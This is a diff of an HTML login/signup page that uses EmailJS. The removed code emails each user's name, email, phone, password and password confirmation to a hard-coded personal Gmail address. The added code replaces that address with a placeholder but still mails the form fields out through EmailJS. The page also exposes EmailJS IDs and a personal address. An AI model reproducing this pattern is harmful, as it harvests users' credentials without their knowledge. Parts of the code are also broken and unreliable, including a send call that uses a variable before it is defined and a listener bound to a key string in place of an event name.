@@ -765,7 +765,7 @@ footer a:hover {
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script type="text/javascript">
         (function(){
-            emailjs.init("user_7iPqN6A4xDFZhWm7ueBly");
+            emailjs.init("user_PGtztibZ6P4HIegi4");
         })();
     </script>
 </head>
@@ -939,15 +939,7 @@ footer a:hover {
 
     <script>
 
-emailjs.send("service_zuwciwm", "template_tu63ek3", emailParams)
-    .then(function(response) {
-        console.log("SUCCESS!", response.status, response.text);
-    }, function(error) {
-        console.log("FAILED...", error);
-    });
-
-
-        document.addEventListener("PGtztibZ6P4HIegi4", function() {
+        document.addEventListener("DOMContentLoaded", function() {
             const loginForm = document.getElementById("loginForm");
             const loginSection = document.getElementById("loginSection");
             const homepageSection = document.getElementById("homepageSection");
@@ -966,7 +958,7 @@ emailjs.send("service_zuwciwm", "template_tu63ek3", emailParams)
     
 
                 const emailParams = {
-                    to_email: "menasamo2010@gmail.com",
+                    to_email: "specified_email@example.com",
                     from_email: email,
                     firstName: firstName,
                     lastName: lastName,
@@ -974,44 +966,12 @@ emailjs.send("service_zuwciwm", "template_tu63ek3", emailParams)
                 };
 
     
-                loginForm.addEventListener("submit", function(e) {
-    e.preventDefault();
-
-    const formData = new FormData(loginForm);
-    const firstName = formData.get("firstName");
-    const lastName = formData.get("lastName");
-    const email = formData.get("email");
-    const phone = formData.get("phone");
-    const password = formData.get("password");
-    const confirmPassword = formData.get("confirmPassword");
-
-    const emailParams = {
-        to_email: "menasamo2010@gmail.com",
-        from_email: email,
-        firstName: firstName,
-        lastName: lastName,
-        phone: phone,
-        password: password,
-        confirmPassword: confirmPassword
-    };
-
-    emailjs.send("service_z2bjkzk", "template_tu63ek3", emailParams)
-        .then(function(response) {
-            console.log("SUCCESS!", response.status, response.text);
-        }, function(error) {
-            console.log("FAILED...", error);
-        });
-
-    localStorage.setItem("firstName", firstName);
-    localStorage.setItem("lastName", lastName);
-    localStorage.setItem("email", email);
-
-    usernameSpan.textContent = `${firstName} ${lastName}`;
-
-    loginSection.style.display = "none";
-    homepageSection.style.display = "block";
-});
-
+                emailjs.send("service_zuwciwm", "template_tu63ek3", emailParams)
+                    .then(function(response) {
+                        console.log("SUCCESS!", response.status, response.text);
+                    }, function(error) {
+                        console.log("FAILED...", error);
+                    });
 
     
                 localStorage.setItem("firstName", firstName);
@@ -1153,7 +1113,7 @@ emailjs.send("service_zuwciwm", "template_tu63ek3", emailParams)
 
 
            
-            emailjs.send("service_1oeliza", "template_9qaiqeg", {
+            emailjs.send("service_zuwciwm", "template_tu63ek3", {
                 firstName: user.firstName,
                 lastName: user.lastName,
                 email: user.email,
